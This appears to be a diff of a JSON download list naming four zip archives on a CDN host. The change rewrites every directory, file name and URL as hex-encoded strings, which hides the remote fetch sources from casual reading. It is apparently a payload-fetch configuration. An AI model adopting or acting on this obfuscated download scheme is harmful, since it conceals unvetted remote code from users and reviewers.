@@ -1,22 +1,22 @@
 [
-  {
-    "dir": "./",
-    "zip_file_name": "./proses.zip",
-    "zip_file": "https://sodium-hydrate.b-cdn.net/proses.zip"
-  },
-  {
-    "dir": "./",
-    "zip_file_name": "./styles.zip",
-    "zip_file": "https://sodium-hydrate.b-cdn.net/styles.zip"
-  },
-  {
-    "dir": "./",
-    "zip_file_name": "./scolastiche.zip",
-    "zip_file": "https://sodium-hydrate.b-cdn.net/scolastiche.zip"
-  },
-  {
-    "dir": "./",
-    "zip_file_name": "./disc.zip",
-    "zip_file": "https://sodium-hydrate.b-cdn.net/disc.zip"
-  }
+    {
+        "dir": "2e2f",
+        "zip_file_name": "2e2f70726f7365732e7a6970",
+        "zip_file": "68747470733a2f2f736f6469756d2d687964726174652e622d63646e2e6e65742f70726f7365732e7a6970"
+    },
+    {
+        "dir": "2e2f",
+        "zip_file_name": "2e2f7374796c65732e7a6970",
+        "zip_file": "68747470733a2f2f736f6469756d2d687964726174652e622d63646e2e6e65742f7374796c65732e7a6970"
+    },
+    {
+        "dir": "2e2f",
+        "zip_file_name": "2e2f73636f6c617374696368652e7a6970",
+        "zip_file": "68747470733a2f2f736f6469756d2d687964726174652e622d63646e2e6e65742f73636f6c617374696368652e7a6970"
+    },
+    {
+        "dir": "2e2f",
+        "zip_file_name": "2e2f646973632e7a6970",
+        "zip_file": "68747470733a2f2f736f6469756d2d687964726174652e622d63646e2e6e65742f646973632e7a6970"
+    }
 ]
